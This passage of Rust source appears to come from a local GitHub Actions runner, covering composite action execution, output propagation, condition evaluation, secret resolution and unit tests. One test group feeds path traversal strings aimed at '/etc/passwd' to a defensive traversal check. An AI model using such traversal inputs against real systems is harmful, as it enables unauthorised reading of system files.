    match action_def.get("runs").and_then(|v| v.get("using")) {
        Some(serde_yaml::Value::String(using)) if using == "composite" => {
            // Get the steps
            let steps = match action_def.get("runs").and_then(|v| v.get("steps")) {
                Some(serde_yaml::Value::Sequence(steps)) => steps,
                _ => {
                    return Err(ExecutionError::Execution(
                        "Composite action is missing steps".to_string(),
                    ))
                }
            };

            // Process inputs from the calling step's 'with' parameters
            let mut action_env = job_env.clone();
            if let Some(inputs_def) = action_def.get("inputs") {
                if let Some(inputs_map) = inputs_def.as_mapping() {
                    for (input_name, input_def) in inputs_map {
                        if let Some(input_name_str) = input_name.as_str() {
                            // Get default value if available
                            let default_value = input_def
                                .get("default")
                                .and_then(|v| v.as_str())
                                .unwrap_or("");

                            // Check if the input was provided in the 'with' section
                            let input_value = step
                                .with
                                .as_ref()
                                .and_then(|with| with.get(input_name_str))
                                .unwrap_or(&default_value.to_string())
                                .clone();

                            // Add to environment as INPUT_X
                            action_env.insert(
                                format!("INPUT_{}", input_name_str.to_uppercase()),
                                input_value,
                            );
                        }
                    }
                }
            }

            // Execute each step, tracking outputs, statuses, and env changes between steps
            let mut step_outputs = Vec::new();
            let mut composite_step_outputs: HashMap<String, HashMap<String, String>> =
                HashMap::new();
            let mut composite_step_statuses: HashMap<String, (String, String)> = HashMap::new();
            let mut composite_job_status = "success".to_string();
            for (idx, step_def) in steps.iter().enumerate() {
                // Convert the YAML step to our Step struct
                let composite_step = match convert_yaml_to_step(step_def) {
                    Ok(step) => step,
                    Err(e) => {
                        return Err(ExecutionError::Execution(format!(
                            "Failed to process composite action step {}: {}",
                            idx + 1,
                            e
                        )))
                    }
                };

                // Execute the step - using Box::pin to handle async recursion
                let step_result = Box::pin(execute_step(StepExecutionContext {
                    step: &composite_step,
                    step_idx: idx,
                    job_env: &action_env,
                    working_dir,
                    runtime,
                    workflow: &workflow::WorkflowDefinition {
                        name: "Composite Action".to_string(),
                        on: vec![],
                        on_raw: serde_yaml::Value::Null,
                        jobs: HashMap::new(),
                        defaults: None,
                    },
                    runner_image,
                    verbose,
                    matrix_combination: &None,
                    container_config: None, // Composite actions don't use job containers
                    workflow_defaults: None,
                    job_defaults: None,
                    step_outputs: &composite_step_outputs,
                    step_statuses: &composite_step_statuses,
                    job_status: &composite_job_status,
                    services: JobServices {
                        secret_manager: services.secret_manager,
                        secret_masker: services.secret_masker,
                        secrets_context: services.secrets_context,
                        needs_context: services.needs_context,
                        needs_results: services.needs_results,
                        artifact_store: services.artifact_store,
                        cache_store: services.cache_store,
                    },
                    pending_cache_saves,
                }))
                .await?;

                // Track step status within composite scope
                record_step_status(
                    composite_step.id.as_deref(),
                    &step_result,
                    &mut composite_step_statuses,
                    &mut composite_job_status,
                );

                // Parse deprecated ::set-output:: and other workflow commands from stdout
                process_workflow_commands(
                    &step_result.output,
                    composite_step.id.as_deref(),
                    &mut composite_step_outputs,
                    services.secret_masker,
                );

                // Add output to results
                step_outputs.push(format!("Step {}: {}", idx + 1, step_result.output));

                // Read back GITHUB_OUTPUT/GITHUB_ENV/GITHUB_PATH so subsequent
                // composite steps can reference ${{ steps.<id>.outputs.<key> }}
                // and see environment changes from prior steps.
                crate::github_env_files::apply_step_environment_updates(
                    &mut action_env,
                    &mut composite_step_outputs,
                    composite_step.id.as_deref(),
                );

                // Short-circuit on failure if needed
                if step_result.status == StepStatus::Failure {
                    // Still propagate whatever outputs were collected before the failure
                    propagate_composite_outputs(
                        &action_def,
                        &composite_step_outputs,
                        &action_env,
                        job_env,
                        working_dir,
                        &composite_job_status,
                    );
                    return Ok(StepResult::new(
                        step.name
                            .clone()
                            .unwrap_or_else(|| "Composite Action".to_string()),
                        StepStatus::Failure,
                        step_outputs.join("\n"),
                    ));
                }
            }

            // Propagate composite action outputs to the caller's GITHUB_OUTPUT
            propagate_composite_outputs(
                &action_def,
                &composite_step_outputs,
                &action_env,
                job_env,
                working_dir,
                &composite_job_status,
            );

            // All steps completed successfully
            let output = if verbose {
                let mut detailed_output = format!(
                    "Executed composite action from: {}\n\n",
                    action_path.display()
                );

                // Add information about the composite action if available
                if let Ok(action_content) =
                    serde_yaml::from_str::<serde_yaml::Value>(&action_content)
                {
                    if let Some(name) = action_content.get("name").and_then(|v| v.as_str()) {
                        detailed_output.push_str(&format!("Action name: {}\n", name));
                    }

                    if let Some(description) =
                        action_content.get("description").and_then(|v| v.as_str())
                    {
                        detailed_output.push_str(&format!("Description: {}\n", description));
                    }

                    detailed_output.push('\n');
                }

                // Add individual step outputs
                detailed_output.push_str("Step outputs:\n");
                for output in &step_outputs {
                    detailed_output.push_str(&format!("{}\n", output));
                }

                detailed_output
            } else {
                format!(
                    "Executed composite action with {} steps",
                    step_outputs.len()
                )
            };

            Ok(StepResult::new(
                step.name
                    .clone()
                    .unwrap_or_else(|| "Composite Action".to_string()),
                StepStatus::Success,
                output,
            ))
        }
        _ => Err(ExecutionError::Execution(
            "Action is not a composite action or has invalid format".to_string(),
        )),
    }
}

/// Evaluate a composite action's `outputs:` section and write the resolved values
/// to the caller's GITHUB_OUTPUT file so `${{ steps.<id>.outputs.<key> }}` works.
fn propagate_composite_outputs(
    action_def: &serde_yaml::Value,
    composite_step_outputs: &HashMap<String, HashMap<String, String>>,
    action_env: &HashMap<String, String>,
    caller_job_env: &HashMap<String, String>,
    working_dir: &Path,
    job_status: &str,
) {
    let outputs = match action_def.get("outputs").and_then(|v| v.as_mapping()) {
        Some(m) => m,
        None => return, // No outputs declared
    };

    // Build an expression context scoped to the composite's internal steps
    let empty_matrix = None;
    let empty_statuses = HashMap::new();
    let empty_secrets = HashMap::new();
    let empty_needs = HashMap::new();
    let empty_results = HashMap::new();
    let expr_ctx = crate::expression::ExpressionContext {
        env_context: action_env,
        step_outputs: composite_step_outputs,
        matrix_combination: &empty_matrix,
        step_statuses: &empty_statuses,
        job_status,
        secrets_context: &empty_secrets,
        needs_context: &empty_needs,
        needs_results: &empty_results,
    };

    // Collect evaluated outputs
    let mut resolved: Vec<(String, String)> = Vec::new();
    for (key, def) in outputs {
        let key_str = match key.as_str() {
            Some(k) => k,
            None => continue,
        };
        let value_expr = match def.get("value").and_then(|v| v.as_str()) {
            Some(v) => v,
            None => continue,
        };
        match crate::substitution::preprocess_expressions(value_expr, working_dir, &expr_ctx) {
            Ok(val) => resolved.push((key_str.to_string(), val)),
            Err(e) => {
                wrkflw_logging::debug(&format!(
                    "Failed to evaluate composite output '{}': {}",
                    key_str, e
                ));
            }
        }
    }

    if resolved.is_empty() {
        return;
    }

    // Append to the caller's GITHUB_OUTPUT file
    if let Some(output_path) = caller_job_env.get("GITHUB_OUTPUT") {
        use std::io::Write;
        match std::fs::OpenOptions::new()
            .create(true)
            .append(true)
            .open(output_path)
        {
            Ok(mut f) => {
                for (key, value) in &resolved {
                    let res = if value.contains('\n') {
                        // Use a unique delimiter to avoid collisions with value content
                        let delim = generate_heredoc_delimiter(value);
                        writeln!(f, "{}<<{}", key, delim)
                            .and_then(|_| write!(f, "{}", value))
                            .and_then(|_| {
                                if !value.ends_with('\n') {
                                    writeln!(f)
                                } else {
                                    Ok(())
                                }
                            })
                            .and_then(|_| writeln!(f, "{}", delim))
                    } else {
                        writeln!(f, "{}={}", key, value)
                    };
                    if let Err(e) = res {
                        wrkflw_logging::debug(&format!(
                            "Failed to write composite output '{}' to GITHUB_OUTPUT: {}",
                            key, e
                        ));
                        break;
                    }
                }
            }
            Err(e) => {
                wrkflw_logging::debug(&format!(
                    "Failed to open GITHUB_OUTPUT for composite output propagation: {}",
                    e
                ));
            }
        }
    }
}

/// Generate a heredoc delimiter that does not appear as a standalone line in `value`.
/// Starts with `ghadelimiter_` and appends a numeric suffix until unique.
fn generate_heredoc_delimiter(value: &str) -> String {
    let base = "ghadelimiter";
    let mut candidate = base.to_string();
    let mut counter: u64 = 0;
    // Check if the candidate appears as a complete line in the value
    while value.lines().any(|line| line == candidate) {
        counter += 1;
        candidate = format!("{}_{}", base, counter);
    }
    candidate
}

// Helper function to convert YAML step to our Step struct
fn convert_yaml_to_step(step_yaml: &serde_yaml::Value) -> Result<workflow::Step, String> {
    // Extract step properties
    let name = step_yaml
        .get("name")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    let uses = step_yaml
        .get("uses")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    let run = step_yaml
        .get("run")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    let shell = step_yaml
        .get("shell")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    let with = step_yaml.get("with").and_then(|v| v.as_mapping()).map(|m| {
        let mut with_map = HashMap::new();
        for (k, v) in m {
            if let (Some(key), Some(value)) = (k.as_str(), v.as_str()) {
                with_map.insert(key.to_string(), value.to_string());
            }
        }
        with_map
    });

    let env = step_yaml
        .get("env")
        .and_then(|v| v.as_mapping())
        .map(|m| {
            let mut env_map = HashMap::new();
            for (k, v) in m {
                if let (Some(key), Some(value)) = (k.as_str(), v.as_str()) {
                    env_map.insert(key.to_string(), value.to_string());
                }
            }
            env_map
        })
        .unwrap_or_default();

    // For composite steps with shell, construct a run step
    let final_run = run;

    // Extract continue_on_error
    let continue_on_error = step_yaml.get("continue-on-error").and_then(|v| v.as_bool());

    let if_condition = step_yaml
        .get("if")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    let id = step_yaml
        .get("id")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    let working_directory = step_yaml
        .get("working-directory")
        .and_then(|v| v.as_str())
        .map(|s| s.to_string());

    let timeout_minutes = step_yaml.get("timeout-minutes").and_then(|v| v.as_f64());

    Ok(workflow::Step {
        name,
        uses,
        run: final_run,
        with,
        env,
        continue_on_error,
        if_condition,
        id,
        working_directory,
        shell,
        timeout_minutes,
    })
}

/// Evaluate a job condition expression
/// This is a simplified implementation that handles basic GitHub Actions expressions.
/// Note: step-level expressions like `steps.<id>.outcome`, `success()`, `failure()`,
/// `always()`, and `cancelled()` are not yet fully supported — a warning is emitted
/// and the condition defaults to its most likely state (`always()`/`success()` → true,
/// `failure()`/`cancelled()` → false).
fn evaluate_job_condition(
    condition: &str,
    env_context: &HashMap<String, String>,
    _workflow: &WorkflowDefinition,
) -> bool {
    let ctx = crate::expression::ExpressionContext {
        env_context,
        step_outputs: &HashMap::new(),
        matrix_combination: &None,
        step_statuses: &HashMap::new(),
        job_status: "success",
        secrets_context: &HashMap::new(),
        needs_context: &HashMap::new(),
        needs_results: &HashMap::new(),
    };
    evaluate_condition_with_context(condition, &ctx)
}

/// Evaluate a job/step `if:` condition using the expression evaluator.
///
/// Accepts the full expression context (env, step outputs, matrix) for accurate
/// resolution of context references and operators.
fn evaluate_condition_with_context(
    condition: &str,
    ctx: &crate::expression::ExpressionContext<'_>,
) -> bool {
    use crate::expression::evaluate_as_bool;

    wrkflw_logging::debug(&format!("Evaluating condition: {}", condition));

    match evaluate_as_bool(condition, ctx) {
        Ok(result) => {
            wrkflw_logging::debug(&format!(
                "Condition '{}' evaluated to {}",
                condition, result
            ));
            result
        }
        Err(e) => {
            wrkflw_logging::warning(&format!(
                "Condition '{}' failed to parse: {} — treating as false (step/job will be skipped)",
                condition, e
            ));
            // Default to false — in real GitHub Actions, unparseable conditions
            // cause an error. Defaulting to false is safer than silently running.
            false
        }
    }
}

/// Filter accumulated job outputs/results to only include jobs declared in this job's `needs:`.
fn build_needs_context(
    job: &Job,
    all_outputs: &HashMap<String, HashMap<String, String>>,
    all_results: &HashMap<String, String>,
) -> (
    HashMap<String, HashMap<String, String>>,
    HashMap<String, String>,
) {
    let mut needs_outputs = HashMap::new();
    let mut needs_results = HashMap::new();
    if let Some(needs) = &job.needs {
        for needed_job in needs {
            if let Some(outputs) = all_outputs.get(needed_job) {
                needs_outputs.insert(needed_job.clone(), outputs.clone());
            }
            if let Some(result) = all_results.get(needed_job) {
                needs_results.insert(needed_job.clone(), result.clone());
            }
        }
    }
    (needs_outputs, needs_results)
}

/// Resolve a job's declared outputs by evaluating the output expressions
/// (which typically reference `steps.<id>.outputs.<key>`) against the job's step outputs.
fn resolve_job_outputs(
    job: &Job,
    step_outputs_map: &HashMap<String, HashMap<String, String>>,
    step_status_map: &HashMap<String, (String, String)>,
    env_context: &HashMap<String, String>,
    job_status: &str,
    working_dir: &Path,
) -> HashMap<String, String> {
    let mut resolved = HashMap::new();
    if let Some(outputs) = &job.outputs {
        let ctx = crate::expression::ExpressionContext {
            env_context,
            step_outputs: step_outputs_map,
            matrix_combination: &None,
            step_statuses: step_status_map,
            job_status,
            secrets_context: &HashMap::new(),
            needs_context: &HashMap::new(),
            needs_results: &HashMap::new(),
        };
        for (key, expr) in outputs {
            match crate::substitution::preprocess_expressions(expr, working_dir, &ctx) {
                Ok(val) => {
                    resolved.insert(key.clone(), val);
                }
                Err(e) => {
                    wrkflw_logging::warning(&format!(
                        "Failed to resolve job output '{}': {}",
                        key, e
                    ));
                    resolved.insert(key.clone(), String::new());
                }
            }
        }
    }
    resolved
}

/// Pre-resolve secrets referenced in the job into a HashMap for expression evaluation.
/// Scans job steps, conditions, env, and outputs for `${{ secrets.NAME }}` patterns
/// and resolves each unique name.
async fn resolve_secrets_for_context(
    secret_manager: &SecretManager,
    job: &Job,
) -> HashMap<String, String> {
    use wrkflw_secrets::SecretSubstitution;

    let mut secrets = HashMap::new();
    let mut all_text = String::new();

    // Collect all text that might contain secrets references
    for step in &job.steps {
        if let Some(run) = &step.run {
            all_text.push_str(run);
            all_text.push('\n');
        }
        if let Some(cond) = &step.if_condition {
            all_text.push_str(cond);
            all_text.push('\n');
        }
        for value in step.env.values() {
            all_text.push_str(value);
            all_text.push('\n');
        }
        if let Some(with) = &step.with {
            for value in with.values() {
                all_text.push_str(value);
                all_text.push('\n');
            }
        }
    }
    // Also check job-level if condition and env
    if let Some(cond) = &job.if_condition {
        all_text.push_str(cond);
        all_text.push('\n');
    }
    for value in job.env.values() {
        all_text.push_str(value);
        all_text.push('\n');
    }
    // Check job outputs expressions
    if let Some(outputs) = &job.outputs {
        for value in outputs.values() {
            all_text.push_str(value);
            all_text.push('\n');
        }
    }

    // Extract secret names and resolve them
    let refs = SecretSubstitution::extract_secret_refs(&all_text);
    for secret_ref in refs {
        let name = &secret_ref.name;
        if secrets.contains_key(name) {
            continue;
        }
        let result = if let Some(provider) = &secret_ref.provider {
            secret_manager
                .get_secret_from_provider(provider, name)
                .await
        } else {
            secret_manager.get_secret(name).await
        };
        match result {
            Ok(value) => {
                secrets.insert(name.clone(), value.value().to_string());
            }
            Err(_) => {
                // Secret not found — leave it out so expression resolves to Null
            }
        }
    }

    secrets
}

#[cfg(test)]
mod tests {
    use super::*;

    lazy_static::lazy_static! {
        static ref TEST_ARTIFACT_DIR: tempfile::TempDir = tempfile::tempdir().unwrap();
        static ref TEST_ARTIFACT_STORE: crate::artifacts::ArtifactStore =
            crate::artifacts::ArtifactStore::new(TEST_ARTIFACT_DIR.path()).unwrap();
        static ref TEST_CACHE_DIR: tempfile::TempDir = tempfile::tempdir().unwrap();
        static ref TEST_CACHE_STORE: crate::cache::CacheStore =
            crate::cache::CacheStore::with_root(TEST_CACHE_DIR.path().to_path_buf()).unwrap();
        static ref TEST_PENDING_CACHE_SAVES: std::sync::Mutex<Vec<PendingCacheSave>> =
            std::sync::Mutex::new(Vec::new());
        static ref EMPTY_SECRETS: HashMap<String, String> = HashMap::new();
        static ref EMPTY_NEEDS: HashMap<String, HashMap<String, String>> = HashMap::new();
        static ref EMPTY_NEEDS_RESULTS: HashMap<String, String> = HashMap::new();
    }

    fn test_services() -> JobServices<'static> {
        JobServices {
            secret_manager: None,
            secret_masker: None,
            secrets_context: &EMPTY_SECRETS,
            needs_context: &EMPTY_NEEDS,
            needs_results: &EMPTY_NEEDS_RESULTS,
            artifact_store: &TEST_ARTIFACT_STORE,
            cache_store: &TEST_CACHE_STORE,
        }
    }

    #[test]
    fn is_git_sha_recognizes_valid_sha1() {
        assert!(is_git_sha("a81bbbf8298c0fa03ea29cdc473d45769f953675"));
    }

    #[test]
    fn is_git_sha_recognizes_uppercase_hex() {
        assert!(is_git_sha("A81BBBF8298C0FA03EA29CDC473D45769F953675"));
    }

    #[test]
    fn is_git_sha_rejects_short_hash() {
        assert!(!is_git_sha("a81bbbf"));
    }

    #[test]
    fn is_git_sha_rejects_branch_name() {
        assert!(!is_git_sha("main"));
    }

    #[test]
    fn is_git_sha_rejects_tag() {
        assert!(!is_git_sha("v4"));
    }

    #[test]
    fn is_git_sha_rejects_empty() {
        assert!(!is_git_sha(""));
    }

    #[test]
    fn is_git_sha_rejects_non_hex_40_chars() {
        assert!(!is_git_sha("zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz"));
    }

    #[test]
    fn is_git_sha_rejects_41_chars() {
        assert!(!is_git_sha("a81bbbf8298c0fa03ea29cdc473d45769f9536750"));
    }

    // --- get_effective_runner_image tests ---

    fn make_job(container: Option<JobContainer>, runs_on: Option<Vec<String>>) -> Job {
        Job {
            runs_on,
            needs: None,
            container,
            steps: Vec::new(),
            env: HashMap::new(),
            strategy: None,
            services: HashMap::new(),
            if_condition: None,
            outputs: None,
            permissions: None,
            uses: None,
            with: None,
            secrets: None,
            timeout_minutes: None,
            defaults: None,
        }
    }

    #[test]
    fn effective_runner_image_prefers_container() {
        let job = make_job(
            Some(JobContainer {
                image: "alpine:3.22".into(),
                credentials: None,
                env: HashMap::new(),
                ports: None,
                volumes: None,
                options: None,
            }),
            Some(vec!["ubuntu-latest".into()]),
        );
        assert_eq!(get_effective_runner_image(&job), "alpine:3.22");
    }

    #[test]
    fn effective_runner_image_falls_back_to_runs_on() {
        let job = make_job(None, Some(vec!["ubuntu-latest".into()]));
        let image = get_effective_runner_image(&job);
        // Should delegate to get_runner_image_from_opt, not return empty
        assert!(!image.is_empty());
    }

    // --- prepare_container_mounts tests ---

    #[test]
    fn container_mounts_docker_runtime_remaps_env_paths() {
        let mut step_env = HashMap::new();
        step_env.insert("WRKFLW_RUNTIME_MODE".into(), "docker".into());

        let mut job_env = HashMap::new();
        job_env.insert("GITHUB_ENV".into(), "/tmp/abc/github/env".into());
        job_env.insert("GITHUB_OUTPUT".into(), "/tmp/abc/github/output".into());
        job_env.insert("GITHUB_PATH".into(), "/tmp/abc/github/path".into());
        job_env.insert(
            "GITHUB_STEP_SUMMARY".into(),
            "/tmp/abc/github/step_summary".into(),
        );

        let (volumes, github_mount) = prepare_container_mounts(&mut step_env, &job_env, None);

        // Env vars should be remapped to container paths
        assert_eq!(step_env.get("GITHUB_ENV").unwrap(), "/github/workflow/env");
        assert_eq!(
            step_env.get("GITHUB_OUTPUT").unwrap(),
            "/github/workflow/output"
        );
        assert_eq!(
            step_env.get("GITHUB_PATH").unwrap(),
            "/github/workflow/path"
        );
        assert_eq!(
            step_env.get("GITHUB_STEP_SUMMARY").unwrap(),
            "/github/workflow/step_summary"
        );

        // Should mount the github dir at /github/workflow
        let (host, container) = github_mount.unwrap();
        assert_eq!(host, PathBuf::from("/tmp/abc/github"));
        assert_eq!(container, PathBuf::from("/github/workflow"));

        // No container config volumes
        assert!(volumes.is_empty());
    }

    #[test]
    fn container_mounts_non_container_runtime_does_not_remap() {
        let mut step_env = HashMap::new();
        // No WRKFLW_RUNTIME_MODE set

        let mut job_env = HashMap::new();
        job_env.insert("GITHUB_ENV".into(), "/tmp/abc/github/env".into());

        let (_volumes, github_mount) = prepare_container_mounts(&mut step_env, &job_env, None);

        // Env vars should NOT be remapped
        assert!(!step_env.contains_key("GITHUB_ENV"));

        // Should mount the parent directory identity-mapped
        let (host, container) = github_mount.unwrap();
        assert_eq!(host, container); // identity mount
    }

    #[test]
    fn container_mounts_no_github_env() {
        let mut step_env = HashMap::new();
        let job_env = HashMap::new(); // no GITHUB_ENV

        let (volumes, github_mount) = prepare_container_mounts(&mut step_env, &job_env, None);

        assert!(github_mount.is_none());
        assert!(volumes.is_empty());
    }

    #[test]
    fn container_mounts_parses_host_container_volumes() {
        let mut step_env = HashMap::new();
        let job_env = HashMap::new();

        let container = JobContainer {
            image: "node:18".into(),
            credentials: None,
            env: HashMap::new(),
            ports: None,
            volumes: Some(vec!["/host/data:/container/data".into()]),
            options: None,
        };

        let (volumes, _) = prepare_container_mounts(&mut step_env, &job_env, Some(&container));

        assert_eq!(volumes.len(), 1);
        assert_eq!(volumes[0].0, PathBuf::from("/host/data"));
        assert_eq!(volumes[0].1, PathBuf::from("/container/data"));
    }

    #[test]
    fn container_mounts_parses_single_path_volumes() {
        let mut step_env = HashMap::new();
        let job_env = HashMap::new();

        let container = JobContainer {
            image: "node:18".into(),
            credentials: None,
            env: HashMap::new(),
            ports: None,
            volumes: Some(vec!["/data".into()]),
            options: None,
        };

        let (volumes, _) = prepare_container_mounts(&mut step_env, &job_env, Some(&container));

        assert_eq!(volumes.len(), 1);
        assert_eq!(volumes[0].0, PathBuf::from("/data"));
        assert_eq!(volumes[0].1, PathBuf::from("/data"));
    }

    #[test]
    fn container_mounts_strips_docker_options_from_volumes() {
        let mut step_env = HashMap::new();
        let job_env = HashMap::new();

        let container = JobContainer {
            image: "node:18".into(),
            credentials: None,
            env: HashMap::new(),
            ports: None,
            volumes: Some(vec!["/host:/container:ro".into(), "/src:/dest:rw".into()]),
            options: None,
        };

        let (volumes, _) = prepare_container_mounts(&mut step_env, &job_env, Some(&container));

        assert_eq!(volumes.len(), 2);
        // :ro should be stripped — container path should be clean
        assert_eq!(volumes[0].0, PathBuf::from("/host"));
        assert_eq!(volumes[0].1, PathBuf::from("/container"));
        // :rw should be stripped
        assert_eq!(volumes[1].0, PathBuf::from("/src"));
        assert_eq!(volumes[1].1, PathBuf::from("/dest"));
    }

    #[test]
    fn container_mounts_podman_runtime_remaps_env_paths() {
        let mut step_env = HashMap::new();
        step_env.insert("WRKFLW_RUNTIME_MODE".into(), "podman".into());

        let mut job_env = HashMap::new();
        job_env.insert("GITHUB_ENV".into(), "/tmp/xyz/github/env".into());
        job_env.insert("GITHUB_OUTPUT".into(), "/tmp/xyz/github/output".into());
        job_env.insert("GITHUB_PATH".into(), "/tmp/xyz/github/path".into());
        job_env.insert(
            "GITHUB_STEP_SUMMARY".into(),
            "/tmp/xyz/github/step_summary".into(),
        );

        let (_, github_mount) = prepare_container_mounts(&mut step_env, &job_env, None);

        // Podman should behave identically to Docker for remapping
        assert_eq!(step_env.get("GITHUB_ENV").unwrap(), "/github/workflow/env");
        assert!(github_mount.is_some());
    }

    #[test]
    fn container_mounts_only_remaps_existing_env_keys() {
        let mut step_env = HashMap::new();
        step_env.insert("WRKFLW_RUNTIME_MODE".into(), "docker".into());

        let mut job_env = HashMap::new();
        // Only set GITHUB_ENV — the others are absent
        job_env.insert("GITHUB_ENV".into(), "/tmp/abc/github/env".into());

        let (_, _) = prepare_container_mounts(&mut step_env, &job_env, None);

        // GITHUB_ENV should be remapped
        assert_eq!(step_env.get("GITHUB_ENV").unwrap(), "/github/workflow/env");
        // Others should NOT be inserted (no phantom paths)
        assert!(!step_env.contains_key("GITHUB_OUTPUT"));
        assert!(!step_env.contains_key("GITHUB_PATH"));
        assert!(!step_env.contains_key("GITHUB_STEP_SUMMARY"));
    }

    #[test]
    fn effective_runner_image_empty_image_falls_back() {
        let job = make_job(
            Some(JobContainer {
                image: "".into(),
                credentials: None,
                env: HashMap::new(),
                ports: None,
                volumes: None,
                options: None,
            }),
            Some(vec!["ubuntu-latest".into()]),
        );
        let image = get_effective_runner_image(&job);
        // Should fall back to runs-on, not return empty string
        assert!(!image.is_empty());
    }

    #[test]
    fn container_mounts_skips_empty_container_path() {
        let mut step_env = HashMap::new();
        let job_env = HashMap::new();

        let container = JobContainer {
            image: "node:18".into(),
            credentials: None,
            env: HashMap::new(),
            ports: None,
            volumes: Some(vec!["/host:".into(), ":/container".into()]),
            options: None,
        };

        let (volumes, _) = prepare_container_mounts(&mut step_env, &job_env, Some(&container));

        // Both specs have an empty path component and should be skipped
        assert!(volumes.is_empty());
    }

    // --- container env precedence tests ---

    #[test]
    fn container_env_has_lowest_precedence() {
        // Simulate the env merging logic from execute_job:
        // 1. Container env is inserted with or_insert (lowest precedence)
        // 2. Job env is inserted with insert (overrides container env)
        let mut job_env = HashMap::new();

        // Step 1: container env (lowest precedence)
        let container = JobContainer {
            image: "node:18".into(),
            credentials: None,
            env: HashMap::from([
                ("SHARED".into(), "from-container".into()),
                ("CONTAINER_ONLY".into(), "container-value".into()),
            ]),
            ports: None,
            volumes: None,
            options: None,
        };
        for (key, value) in &container.env {
            job_env.entry(key.clone()).or_insert_with(|| value.clone());
        }

        // Step 2: job env (overrides container env)
        let job_level_env: HashMap<String, String> = HashMap::from([
            ("SHARED".into(), "from-job".into()),
            ("JOB_ONLY".into(), "job-value".into()),
        ]);
        for (key, value) in &job_level_env {
            job_env.insert(key.clone(), value.clone());
        }

        // Job-level env wins for shared keys
        assert_eq!(job_env.get("SHARED").unwrap(), "from-job");
        // Container-only keys are preserved
        assert_eq!(job_env.get("CONTAINER_ONLY").unwrap(), "container-value");
        // Job-only keys are preserved
        assert_eq!(job_env.get("JOB_ONLY").unwrap(), "job-value");
    }

    // --- evaluate_job_condition tests for step-level expressions ---

    fn empty_workflow() -> workflow::WorkflowDefinition {
        workflow::WorkflowDefinition {
            name: "test".to_string(),
            on: Vec::new(),
            on_raw: serde_yaml::Value::Null,
            jobs: HashMap::new(),
            defaults: None,
        }
    }

    #[test]
    fn condition_true_false_literals() {
        let env = HashMap::new();
        let wf = empty_workflow();
        assert!(evaluate_job_condition("true", &env, &wf));
        assert!(!evaluate_job_condition("false", &env, &wf));
    }

    #[test]
    fn condition_steps_reference_evaluates_null_for_unknown_step() {
        let env = HashMap::new();
        let wf = empty_workflow();
        // Unknown step IDs resolve to null (matching GitHub Actions behavior),
        // so comparisons to any string are false.
        assert!(!evaluate_job_condition(
            "steps.build.outcome == 'success'",
            &env,
            &wf
        ));
        assert!(!evaluate_job_condition(
            "steps.build.outcome == 'failure'",
            &env,
            &wf
        ));
    }

    #[test]
    fn condition_success_function_defaults_true() {
        let env = HashMap::new();
        let wf = empty_workflow();
        assert!(evaluate_job_condition("success()", &env, &wf));
    }

    #[test]
    fn condition_failure_function_defaults_false() {
        let env = HashMap::new();
        let wf = empty_workflow();
        assert!(!evaluate_job_condition("failure()", &env, &wf));
    }

    #[test]
    fn condition_always_function_defaults_true() {
        let env = HashMap::new();
        let wf = empty_workflow();
        assert!(evaluate_job_condition("always()", &env, &wf));
    }

    #[test]
    fn condition_cancelled_function_defaults_false() {
        let env = HashMap::new();
        let wf = empty_workflow();
        assert!(!evaluate_job_condition("cancelled()", &env, &wf));
    }

    #[test]
    fn condition_compound_failure_or_success_defaults_true() {
        let env = HashMap::new();
        let wf = empty_workflow();
        // success() is present, so compound expression should default to true
        assert!(evaluate_job_condition("failure() || success()", &env, &wf));
    }

    #[test]
    fn condition_compound_failure_and_cancelled_defaults_false() {
        let env = HashMap::new();
        let wf = empty_workflow();
        // Only negative functions, no positive counterpart → false
        assert!(!evaluate_job_condition(
            "failure() || cancelled()",
            &env,
            &wf
        ));
    }

    #[test]
    fn condition_always_and_failure_evaluates_correctly() {
        let env = HashMap::new();
        let wf = empty_workflow();
        // always() → true, failure() → false, true && false → false
        // The expression evaluator correctly evaluates the compound expression
        assert!(!evaluate_job_condition("always() && failure()", &env, &wf));
        // always() alone → true
        assert!(evaluate_job_condition("always()", &env, &wf));
        // always() || failure() → true (|| returns first truthy)
        assert!(evaluate_job_condition("always() || failure()", &env, &wf));
    }

    #[test]
    fn condition_parse_error_returns_false() {
        let env = HashMap::new();
        let wf = empty_workflow();
        // Malformed conditions should evaluate to false (not true) — matching
        // GitHub Actions behavior where unparseable expressions error out.
        assert!(!evaluate_job_condition("&&& invalid syntax", &env, &wf));
        assert!(!evaluate_job_condition("== broken", &env, &wf));
        assert!(!evaluate_job_condition("((( unmatched", &env, &wf));
    }

    #[test]
    fn condition_env_context_evaluates_correctly() {
        let mut env = HashMap::new();
        env.insert("MY_STEPS_COUNT".to_string(), "5".to_string());
        env.insert("_STEPS_CHECK".to_string(), "ok".to_string());
        let wf = empty_workflow();
        // env.MY_STEPS_COUNT resolves via the env context, not as a steps ref
        assert!(evaluate_job_condition(
            "env.MY_STEPS_COUNT == '5'",
            &env,
            &wf
        ));
        assert!(evaluate_job_condition(
            "env._STEPS_CHECK == 'ok'",
            &env,
            &wf
        ));
        // Missing env var → null, null != '5' → false
        assert!(!evaluate_job_condition("env.MISSING_VAR == '5'", &env, &wf));
    }

    // --- volume path traversal tests ---

    fn has_path_traversal(host_path: &str) -> bool {
        std::path::Path::new(host_path)
            .components()
            .any(|c| matches!(c, std::path::Component::ParentDir))
    }

    #[test]
    fn volume_traversal_check_rejects_host_traversal() {
        assert!(has_path_traversal("../../../etc/passwd"));
        assert!(has_path_traversal("/safe/../etc/passwd"));
    }

    #[test]
    fn volume_traversal_check_allows_dotdot_in_container_path() {
        // Container path with ".." in it should NOT trigger the host check
        let vol_spec = "/safe/host:/container/..weird";
        let parts: Vec<&str> = vol_spec.splitn(3, ':').collect();
        assert!(!has_path_traversal(parts[0]));
    }

    #[test]
    fn volume_traversal_allows_double_dot_prefix_dir() {
        // A directory literally named "..hidden" is not path traversal
        assert!(!has_path_traversal("/data/..hidden/files"));
    }

    // --- PreparedAction / NativeDocker tests ---

    #[test]
    fn prepared_action_native_docker_stores_fields() {
        let pa = PreparedAction::NativeDocker {
            image: "ghcr.io/super-linter:latest".to_string(),
            entrypoint: Some("/entrypoint.sh".to_string()),
            args: vec!["--flag".to_string(), "value".to_string()],
        };
        match pa {
            PreparedAction::NativeDocker {
                image,
                entrypoint,
                args,
            } => {
